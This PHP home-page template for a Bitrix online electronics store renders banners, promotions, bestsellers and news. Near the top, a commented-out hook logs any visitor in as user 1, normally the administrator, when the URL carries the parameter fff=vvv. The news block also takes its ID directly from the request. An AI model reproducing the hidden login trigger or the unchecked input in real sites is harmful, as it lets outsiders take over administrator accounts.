<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetPageProperty("description", "Интернет-магазин современной и умной техники и электроники Юнимаркет. Доставка по всей Беларуси. Акции и скидки. Гарантия качества.");
$APPLICATION->SetPageProperty("title", "Интернет-магазин полезной техники и подарков Юнимаркет👉+375 (29) 313-63-80");
$APPLICATION->SetTitle("Интернет-магазин полезной техники и подарков Юнимаркет👉+375 (29) 313-63-80");

use Bitrix\Highloadblock\HighloadBlockTable as HLBT;
CModule::IncludeModule('highloadblock');

if($_GET['fff'] == 'vvv')
{

    /*global $USER;
    $USER->Authorize(1);*/
}
?>


	<div class="row">
		<div id="contents" role="main" class="main-page  col-lg-12 col-md-12 col-sm-12 col-xs-12">
			<div class="post-9 page type-page status-publish hentry">
				<div class="entry-content">
					<div class="entry-summary">
						<div data-vc-full-width="true" data-vc-full-width-init="false" class="vc_row wpb_row vc_row-fluid vc_custom_1478574601581 vc_row-has-fill">
							<div class="wpb_column vc_column_container vc_col-sm-12 vc_col-lg-3 vc_col-md-3 vc_col-xs-12">
								<div class="vc_column-inner vc_custom_1478574737557">
									<div class="wpb_wrapper"></div>
								</div>
							</div>
							<div class="slideshow-home1 wpb_column vc_column_container vc_col-sm-12 vc_col-lg-9 vc_col-md-9 vc_col-xs-12">
								<div class="vc_column-inner vc_custom_1478574722742">
									<div class="wpb_wrapper my_wapper">
										<div id="rev_slider_1_1" class="fullwidthabanner">
											<div class="rev_slider owl-carousel">
												<?
	                      function GetEntityDataClass_mainslider($HlBlockId) {
	                          if (empty($HlBlockId) || $HlBlockId < 1){
	                              return false;
	                          }
	                          $hlblock = HLBT::getById($HlBlockId)->fetch();
	                          $entity = HLBT::compileEntity($hlblock);
	                          $entity_data_class = $entity->getDataClass();
	                          return $entity_data_class;
	                      }

	                      $entity_data_class = GetEntityDataClass_mainslider(4);
	                      $rsData = $entity_data_class::getList();
	                      while($el = $rsData->fetch()){
														$img = CFile::ResizeImageGet($el['UF_IMAGE_BANNER_R'], array('width'=>650, 'height'=>340), BX_RESIZE_IMAGE_EXACT, true, false, false, 95); ?>
														<div class="item_big_ban index_b">
															<a class="item_ban_right" href="<?=$el['UF_LINK_BAN']?>">
																<img src="<?=$img['src']?>">
																<div class="content_item_big_ban">
																	<div><?=$el['UF_TITLE']?></div>
																	<p><?=$el['	UF_TEXT']?></p>
																</div>
															</a>
														</div>
	                      <? } ?>
											</div>
										</div>
										<div class="wpb_single_image">
                      <?
                      function GetEntityDataClass_rightslider($HlBlockId) {
                          if (empty($HlBlockId) || $HlBlockId < 1){
                              return false;
                          }
                          $hlblock = HLBT::getById($HlBlockId)->fetch();
                          $entity = HLBT::compileEntity($hlblock);
                          $entity_data_class = $entity->getDataClass();
                          return $entity_data_class;
                      }

                      $entity_data_class = GetEntityDataClass_rightslider(3);
                      $rsData = $entity_data_class::getList();
                      $count = 0;
                      while($el = $rsData->fetch()){
                        $count++;
                        if($count < 3){
													$img = CFile::ResizeImageGet($el['UF_IMAGE_BANNER_R'], array('width'=>250, 'height'=>170), BX_RESIZE_IMAGE_EXACT, true, false, false, 90); ?>
                          <div class="parent_item_ban_right">
                              <a class='item_ban_right' href="<?=$el['UF_LINK_BAN_R']?>">
                                  <img src='<?=$img['src']?>'>
                                  <div class="content_item_big_ban">
                                      <div><?=$el['UF_TITLE_R']?></div>
                                      <p><?=$el['UF_TEXT_R']?></p>
                                  </div>
                              </a>
                          </div>
                        <? }
                      } ?>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="partner_list">
							<?
							function GetEntityDataClass_partners($HlBlockId) {
									if (empty($HlBlockId) || $HlBlockId < 1){
											return false;
									}
									$hlblock = HLBT::getById($HlBlockId)->fetch();
									$entity = HLBT::compileEntity($hlblock);
									$entity_data_class = $entity->getDataClass();
									return $entity_data_class;
							}

							$entity_data_class = GetEntityDataClass_partners(5);
							$rsData = $entity_data_class::getList();
							while($el = $rsData->fetch()){
								$img = CFile::ResizeImageGet($el['UF_IMAGE'], array('width'=>300, 'height'=>100), BX_RESIZE_IMAGE_EXACT, true, false, false, 90); ?>
								<a class="item_partner_list" href="<?=$el['UF_LINK']?>">
									<img src='<?=$img['src']?>'>
								</a>
							<? } ?>
						</div>
						<div class="vc_row wpb_row vc_row-fluid index_act_top">
							<div class="wpb_column vc_column_container vc_col-sm-12 vc_col-lg-9 vc_col-md-9 vc_col-xs-12 act_index_act_top">
								<div class="vc_column-inner vc_custom_1475554484355">
									<div class="sale_block">
										<div class="sw-woo-container-slider responsive owl-carousel-slider countdown-slider"  data-entity="<?=$containerName?>">
											<div class="resp-slider-container">
												<div class="box-title">
													<h3>Акция</h3>
												</div>
												<div class="my_slider slider owl-carousel" data-entity="items-row">

													<? $res = CIBlockElement::GetList(Array("SORT"=>"ASC"), Array("IBLOCK_ID"=>2,  "ACTIVE"=>"Y", "SECTION_ID"=>143));
													while($item = $res->GetNext()){ ?>
														<div class="item-countdown product" data-entity="item">
															 <div class="item-wrap">
																 <div class="item-detail">
																	 <div class="item-image-countdown">
																		<!-- <div class="sale-off" id="<?=$itemIds['DSC_PERC']?>"><?=-$price['PERCENT']?>%</div> -->
																		 <a href="<?=$item["DETAIL_PAGE_URL"]?>">
																			 <? $img = CFile::ResizeImageGet($item['PREVIEW_PICTURE'], array('width'=>270, 'height'=>270), BX_RESIZE_IMAGE_EXACT, true, false, false, 95); ?>
																			 <img src="<?=$img['src']?>" class="attachment-shop_catalog size-shop_catalog wp-post-image">
																		 </a>
																	 </div>
																	 <div class="item-content">
																		 <h4><a href="<?=$item["DETAIL_PAGE_URL"]?>" title="ut labore et"><?=$item["NAME"]?></a></h4>
																		 <div class="description"><?=substr(strip_tags($item["~PREVIEW_TEXT"]), 0, 300);?>...</div>
																		 <!-- <div class="item-price">
																			 <span>
																				 <del>
																					 <span class="woocommerce-Price-amount amount" id="<?=$itemIds['PRICE_OLD']?>" <?=($price['RATIO_PRICE'] >= $price['RATIO_BASE_PRICE'] ? 'style="display: none;"' : '')?>>
																						 <span class="woocommerce-Price-currencySymbol"></span>
																						 <?=$item["PRICES"]["BASE"]["PRINT_VALUE_VAT"]?>
																					 </span>
																				 </del>
																				 <ins>
																					 <span class="woocommerce-Price-amount amount">
																						 <span class="woocommerce-Price-currencySymbol">
																						 <?=$item["PRICES"]["BASE"]["PRINT_DISCOUNT_VALUE"]?>
																					 </span>
																				 </ins>
																			 </span>
																		 </div> -->
																	 </div>
																 </div>
															 </div>
														 </div>
													<? } ?>

												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="wpb_column vc_column_container vc_col-sm-12 vc_col-lg-3 vc_col-md-3 vc_col-xs-12 top_index_act_top">
								<div class="vc_column-inner vc_custom_1477735441688">
									<div class="wpb_wrapper">
										<div id="bestsale-14718236481517810979" class="sw-best-seller-product vc_element">
											<div class="box-title">
												<h3><span>Хиты</span> продаж</h3></div>
												<?$APPLICATION->IncludeComponent(
													"bitrix:catalog.top",
													"hit_buy_index",
													array(
														"COMPONENT_TEMPLATE" => "hit_buy_index",
														"IBLOCK_TYPE" => "catalog",
														"IBLOCK_ID" => "2",
														"FILTER_NAME" => "",
														"CUSTOM_FILTER" => "{\"CLASS_ID\":\"CondGroup\",\"DATA\":{\"All\":\"AND\",\"True\":\"True\"},\"CHILDREN\":{\"1\":{\"CLASS_ID\":\"CondIBProp:2:51\",\"DATA\":{\"logic\":\"Equal\",\"value\":18}}}}",
														"HIDE_NOT_AVAILABLE" => "N",
														"HIDE_NOT_AVAILABLE_OFFERS" => "N",
														"ELEMENT_SORT_FIELD" => "sort",
														"ELEMENT_SORT_ORDER" => "asc",
														"ELEMENT_SORT_FIELD2" => "id",
														"ELEMENT_SORT_ORDER2" => "desc",
														"ELEMENT_COUNT" => "9",
														"LINE_ELEMENT_COUNT" => "3",
														"PROPERTY_CODE" => array(
															0 => "",
															1 => "",
														),
														"PROPERTY_CODE_MOBILE" => array(
														),
														"OFFERS_LIMIT" => "5",
														"VIEW_MODE" => "SECTION",
														"TEMPLATE_THEME" => "blue",
														"ADD_PICT_PROP" => "-",
														"LABEL_PROP" => array(
														),
														"SHOW_DISCOUNT_PERCENT" => "Y",
														"SHOW_OLD_PRICE" => "Y",
														"SHOW_MAX_QUANTITY" => "N",
														"SHOW_CLOSE_POPUP" => "Y",
														"PRODUCT_SUBSCRIPTION" => "Y",
														"PRODUCT_ROW_VARIANTS" => "[{'VARIANT':'2','BIG_DATA':false},{'VARIANT':'2','BIG_DATA':false},{'VARIANT':'2','BIG_DATA':false}]",
														"ENLARGE_PRODUCT" => "STRICT",
														"PRODUCT_BLOCKS_ORDER" => "price,props,sku,quantityLimit,quantity,buttons,compare",
														"SHOW_SLIDER" => "Y",
														"SLIDER_INTERVAL" => "3000",
														"SLIDER_PROGRESS" => "N",
														"MESS_BTN_BUY" => "Купить",
														"MESS_BTN_ADD_TO_BASKET" => "В корзину",
														"MESS_BTN_DETAIL" => "Подробнее",
														"MESS_NOT_AVAILABLE" => "Нет в наличии",
														"SECTION_URL" => "",
														"DETAIL_URL" => "",
														"PRODUCT_QUANTITY_VARIABLE" => "quantity",
														"SEF_MODE" => "N",
														"CACHE_TYPE" => "A",
														"CACHE_TIME" => "36000000",
														"CACHE_GROUPS" => "Y",
														"CACHE_FILTER" => "N",
														"ACTION_VARIABLE" => "action",
														"PRODUCT_ID_VARIABLE" => "id",
														"PRICE_CODE" => array(
															0 => "BASE",
														),
														"USE_PRICE_COUNT" => "N",
														"SHOW_PRICE_COUNT" => "1",
														"PRICE_VAT_INCLUDE" => "Y",
														"CONVERT_CURRENCY" => "N",
														"BASKET_URL" => "/basket/",
														"USE_PRODUCT_QUANTITY" => "N",
														"ADD_PROPERTIES_TO_BASKET" => "Y",
														"PRODUCT_PROPS_VARIABLE" => "prop",
														"PARTIAL_PRODUCT_PROPERTIES" => "Y",
														"PRODUCT_PROPERTIES" => array(
														),
														"ADD_TO_BASKET_ACTION" => "ADD",
														"DISPLAY_COMPARE" => "N",
														"MESS_BTN_COMPARE" => "Сравнить",
														"COMPARE_NAME" => "CATALOG_COMPARE_LIST",
														"USE_ENHANCED_ECOMMERCE" => "N",
														"COMPATIBLE_MODE" => "Y",
														"DISCOUNT_PERCENT_POSITION" => "bottom-right"
													),
													false
												);?>
										</div>
									</div>
								</div>
							</div>
						</div>











						<div class="vc_row wpb_row vc_row-fluid">
							<div class="wpb_column vc_column_container vc_col-sm-12">
								<div class="vc_column-inner ">
									<div class="wpb_wrapper">
										<?
										$arSelect = Array("IBLOCK_ID", "ID", "NAME", 'CODE', "SECTION_PAGE_URL", "UF_BACKGROUND_IMAGE");
										$arFilter = Array("IBLOCK_ID"=>2,"!ID"=>"29","SECTION_ID"=>false,"ACTIVE"=>"Y");
										$res = CIBlockSection::GetList(false, $arFilter, false, $arSelect, false);
										$count = 0;
										while($ar_fields = $res->GetNext()){
											$count++;
											$id_cat = $ar_fields["ID"]; ?>
											<div class="sw-wootab-slider sw-ajax sw-woo-tab-default" id="<?=$ar_fields["CODE"]?>">
												<div class="resp-tab" style="position:relative;">
													<div class="category-slider-content <? if($count % 2 == 0){ echo 'style1'; }?> clearfix">
														<!-- Get child category -->
														<div class="box-title">
															<a href="<?=$ar_fields["SECTION_PAGE_URL"]?>">
																<h3><?=$ar_fields["NAME"]?></h3>
															</a>
														</div>
														<div class="tab-content block_index_cat">
															<div class="cat_index_image">
																<a href="<?=$ar_fields["SECTION_PAGE_URL"]?>">
																	<? $img = CFile::ResizeImageGet($ar_fields["UF_BACKGROUND_IMAGE"], array('width'=>190, 'height'=>305), BX_RESIZE_IMAGE_EXACT, true, false, false, 95); ?>
																	<img data-src="<?=$img['src']?>" class="lazy img_cat_index attachment-large size-large" alt=""/>
																</a>
															</div>
															<!-- Product tab slider -->
															<div class="list_prod_cat_index">
																<?$APPLICATION->IncludeComponent(
																	"bitrix:catalog.top",
																	"top_2_index",
																	array(
																		"COMPONENT_TEMPLATE" => "top_2_index",
																		"IBLOCK_TYPE" => "catalog",
																		"IBLOCK_ID" => "2",
																		"FILTER_NAME" => "",
																		"CUSTOM_FILTER" => "{\"CLASS_ID\":\"CondGroup\",\"DATA\":{\"All\":\"AND\",\"True\":\"True\"},\"CHILDREN\":[{\"CLASS_ID\":\"CondIBSection\",\"DATA\":{\"logic\":\"Equal\",\"value\":$id_cat}}]}",
																		"HIDE_NOT_AVAILABLE" => "N",
																		"HIDE_NOT_AVAILABLE_OFFERS" => "N",
																		"ELEMENT_SORT_FIELD" => "sort",
																		"ELEMENT_SORT_ORDER" => "asc",
																		"ELEMENT_SORT_FIELD2" => "id",
																		"ELEMENT_SORT_ORDER2" => "desc",
																		"ELEMENT_COUNT" => "4",
																		"LINE_ELEMENT_COUNT" => "3",
																		"PROPERTY_CODE" => array(
																			0 => "HITBUY",
																			1 => "",
																		),
																		"PROPERTY_CODE_MOBILE" => array(
																		),
																		"OFFERS_LIMIT" => "5",
																		"VIEW_MODE" => "SECTION",
																		"TEMPLATE_THEME" => "blue",
																		"ADD_PICT_PROP" => "-",
																		"LABEL_PROP" => array(
																		),
																		"SHOW_DISCOUNT_PERCENT" => "N",
																		"SHOW_OLD_PRICE" => "N",
																		"SHOW_MAX_QUANTITY" => "N",
																		"SHOW_CLOSE_POPUP" => "N",
																		"PRODUCT_SUBSCRIPTION" => "Y",
																		"PRODUCT_ROW_VARIANTS" => "[{'VARIANT':'1','BIG_DATA':false},{'VARIANT':'1','BIG_DATA':false},{'VARIANT':'1','BIG_DATA':false},{'VARIANT':'1','BIG_DATA':false}]",
																		"ENLARGE_PRODUCT" => "STRICT",
																		"PRODUCT_BLOCKS_ORDER" => "price,props,sku,quantityLimit,quantity,buttons,compare",
																		"SHOW_SLIDER" => "Y",
																		"SLIDER_INTERVAL" => "3000",
																		"SLIDER_PROGRESS" => "N",
																		"MESS_BTN_BUY" => "Купить",
																		"MESS_BTN_ADD_TO_BASKET" => "В корзину",
																		"MESS_BTN_DETAIL" => "Подробнее",
																		"MESS_NOT_AVAILABLE" => "Нет в наличии",
																		"SECTION_URL" => "",
																		"DETAIL_URL" => "",
																		"PRODUCT_QUANTITY_VARIABLE" => "quantity",
																		"SEF_MODE" => "N",
																		"CACHE_TYPE" => "A",
																		"CACHE_TIME" => "36000000",
																		"CACHE_GROUPS" => "Y",
																		"CACHE_FILTER" => "N",
																		"ACTION_VARIABLE" => "action",
																		"PRODUCT_ID_VARIABLE" => "id",
																		"PRICE_CODE" => array(
																			0 => "BASE",
																		),
																		"USE_PRICE_COUNT" => "N",
																		"SHOW_PRICE_COUNT" => "1",
																		"PRICE_VAT_INCLUDE" => "Y",
																		"CONVERT_CURRENCY" => "N",
																		"BASKET_URL" => "/personal/cart/",
																		"USE_PRODUCT_QUANTITY" => "N",
																		"ADD_PROPERTIES_TO_BASKET" => "Y",
																		"PRODUCT_PROPS_VARIABLE" => "prop",
																		"PARTIAL_PRODUCT_PROPERTIES" => "N",
																		"PRODUCT_PROPERTIES" => array(
																		),
																		"ADD_TO_BASKET_ACTION" => "ADD",
																		"DISPLAY_COMPARE" => "N",
																		"MESS_BTN_COMPARE" => "Сравнить",
																		"COMPARE_NAME" => "CATALOG_COMPARE_LIST",
																		"USE_ENHANCED_ECOMMERCE" => "N",
																		"COMPATIBLE_MODE" => "Y"
																	),
																	false
																);?>
															</div>
															<!-- End product tab slider -->
														</div>
													</div>
												</div>
											</div>
										<? } ?>
									</div>
								</div>
							</div>
						</div>
						<div class="vc_row wpb_row vc_row-fluid">
							<div class="wpb_column vc_column_container vc_col-sm-12">
								<div class="vc_column-inner ">
									<div class="wpb_wrapper"></div>
								</div>
							</div>
						</div>
						<div class="vc_row wpb_row vc_row-fluid vc_custom_1484539339918">
							<div class="wpb_column vc_column_container vc_col-sm-12">
								<div class="vc_column-inner ">
									<div class="wpb_wrapper">
										<div class="clear"></div>
										<?$APPLICATION->IncludeComponent(
											"bitrix:news.list",
											"news_index",
											array(
												"COMPONENT_TEMPLATE" => "news_index",
												"IBLOCK_TYPE" => "news",
												"IBLOCK_ID" => $_REQUEST["ID"],
												"NEWS_COUNT" => "20",
												"SORT_BY1" => "ACTIVE_FROM",
												"SORT_ORDER1" => "DESC",
												"SORT_BY2" => "SORT",
												"SORT_ORDER2" => "ASC",
												"FILTER_NAME" => "",
												"FIELD_CODE" => array(
													0 => "",
													1 => "",
												),
												"PROPERTY_CODE" => array(
													0 => "",
													1 => "",
												),
												"CHECK_DATES" => "Y",
												"DETAIL_URL" => "",
												"AJAX_MODE" => "N",
												"AJAX_OPTION_JUMP" => "N",
												"AJAX_OPTION_STYLE" => "Y",
												"AJAX_OPTION_HISTORY" => "N",
												"AJAX_OPTION_ADDITIONAL" => "",
												"CACHE_TYPE" => "A",
												"CACHE_TIME" => "36000000",
												"CACHE_FILTER" => "N",
												"CACHE_GROUPS" => "Y",
												"PREVIEW_TRUNCATE_LEN" => "",
												"ACTIVE_DATE_FORMAT" => "d.m.Y",
												"SET_TITLE" => "Y",
												"SET_BROWSER_TITLE" => "Y",
												"SET_META_KEYWORDS" => "Y",
												"SET_META_DESCRIPTION" => "Y",
												"SET_LAST_MODIFIED" => "N",
												"INCLUDE_IBLOCK_INTO_CHAIN" => "Y",
												"ADD_SECTIONS_CHAIN" => "Y",
												"HIDE_LINK_WHEN_NO_DETAIL" => "N",
												"PARENT_SECTION" => "",
												"PARENT_SECTION_CODE" => "",
												"INCLUDE_SUBSECTIONS" => "Y",
												"STRICT_SECTION_CHECK" => "N",
												"DISPLAY_DATE" => "Y",
												"DISPLAY_NAME" => "Y",
												"DISPLAY_PICTURE" => "Y",
												"DISPLAY_PREVIEW_TEXT" => "Y",
												"PAGER_TEMPLATE" => ".default",
												"DISPLAY_TOP_PAGER" => "N",
												"DISPLAY_BOTTOM_PAGER" => "Y",
												"PAGER_TITLE" => "Новости",
												"PAGER_SHOW_ALWAYS" => "N",
												"PAGER_DESC_NUMBERING" => "N",
												"PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
												"PAGER_SHOW_ALL" => "N",
												"PAGER_BASE_LINK_ENABLE" => "N",
												"SET_STATUS_404" => "N",
												"SHOW_404" => "N",
												"MESSAGE_404" => ""
											),
											false
										);?>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="clearfix"></div>
			</div>
		</div>
	</div>


<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>
